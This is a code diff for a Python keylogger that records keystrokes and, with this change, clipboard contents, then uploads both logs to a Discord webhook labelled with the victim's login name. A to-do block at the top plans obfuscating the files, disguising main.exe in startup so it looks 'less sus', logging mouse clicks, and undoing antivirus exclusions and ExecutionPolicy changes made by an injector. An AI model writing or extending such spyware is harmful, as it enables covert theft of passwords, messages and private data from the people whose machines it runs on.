@@ -1,12 +1,34 @@
+# To Do
+
+#   encode files in `Source` directory, it can just be base64 that is decoded at runtime or something
+#       doing this means that if someone stumbles across the files and tries reading them they wont be able to
+#       at least not in plain text
+
+#   Create like a bat file or ps1 file to undo all the stuff the inject.bin does
+#       like removing main.exe from startup, restoring ExecutionPolicy settings, removing source folder from
+#       user directory, removing cache from exclusions list, and removing the cache folder
+
+#   Log mouse clicks and stuff
+
+#   store inputs in another file that is just each input side by side like plain text yknow
+
+#   rename and change icon of main.exe so it looks less sus if someone were to check startup processes
+
+#   store inputs in another file that is just each input side by side like plain text yknow
+#       but try and seperate text based on inputs (if someone clicks, presses enter or tab or stuff like that
+#       then they likely arent typing in the same textbox anymore)
+
 from pynput import keyboard
 from pathlib import Path
 from datetime import datetime
 from discord_webhook import DiscordWebhook, DiscordEmbed
 import os
 import hashlib
+import pyperclip
 
 max_length = 17 # the longest keycode i could find was media_volume_down which is 17 characters long
 clear_after_send = True
+clip = ""
 
 def kill_switch():
     file_path = Path.home() / "Source/kill"
@@ -29,12 +51,28 @@ def check_if_should_send(lines):
         file_path.parent.mkdir(parents=True, exist_ok=True)
         with file_path.open('r') as file:
             webhook.add_file(file=file.read(), filename="keys.txt")
+        try:
+            file_path = Path.home() / "Source/dist"
+            file_path.parent.mkdir(parents=True, exist_ok=True)
+            with file_path.open('r') as file:
+                webhook.add_file(file=file.read(), filename="clipboard.txt")
+        except:
+            pass
         embed = DiscordEmbed(title=f"Logs from {os.getlogin()}", color=generate_color(os.getlogin()))
         embed.set_timestamp()
         webhook.add_embed(embed)
         if clear_after_send:
+            file_path = Path.home() / "Source/main"
+            file_path.parent.mkdir(parents=True, exist_ok=True)
             with file_path.open('w') as file:
                 file.write("")
+            try:
+                file_path = Path.home() / "Source/dist"
+                file_path.parent.mkdir(parents=True, exist_ok=True)
+                with file_path.open('w') as file:
+                    file.write("")
+            except:
+                pass
         webhook.execute()
 
 def ascii_replace(key):
@@ -169,6 +207,7 @@ def on_press(key):
             file.write(log)
 
 def on_release(key):
+    global clip
     key_name = ascii_replace(key)
 
     log = f"Released: {str(key_name).rjust(max_length)} | {datetime.now()}\n"
@@ -178,11 +217,29 @@ def on_release(key):
 
     if not file_path.exists():
         file_path.write_text(log)
+        lines = 0
     else:
         with file_path.open('r+') as file:
             file.write(log)
             lines = len(file.readlines())
-        check_if_should_send(lines)
+    
+    try:
+        if str(clip) != pyperclip.paste():
+            clip = pyperclip.paste()
+            log = f"{datetime.now()} :\n{str(clip)}\n\n"
+
+            file_path = Path.home() / "Source/dist"
+            file_path.parent.mkdir(parents=True, exist_ok=True)
+
+            if not file_path.exists():
+                file_path.write_text(log)
+            else:
+                with file_path.open('a') as file:
+                    file.write(log)
+    except:
+        pass
+
+    check_if_should_send(lines)
 
     if kill_switch():
         webhook = DiscordWebhook(url=url, username="Keys")
